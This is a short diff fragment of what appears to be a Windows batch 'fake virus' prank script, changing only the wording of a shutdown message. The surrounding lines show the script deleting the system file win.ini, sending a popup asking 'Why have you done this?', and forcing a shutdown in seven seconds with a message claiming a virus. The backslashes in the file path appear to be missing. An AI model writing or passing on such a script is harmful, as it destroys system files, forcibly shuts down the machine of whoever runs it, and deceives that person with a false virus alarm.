@@ -20,4 +20,4 @@ del c:windowswin.ini
 
 msg * Why have you done this?
 
-shutdown -s -t 7 -c "A VIRUS IS TAKING OVER c:Drive"
+shutdown -s -t 7 -c "Virus Detected, Shutting Down."
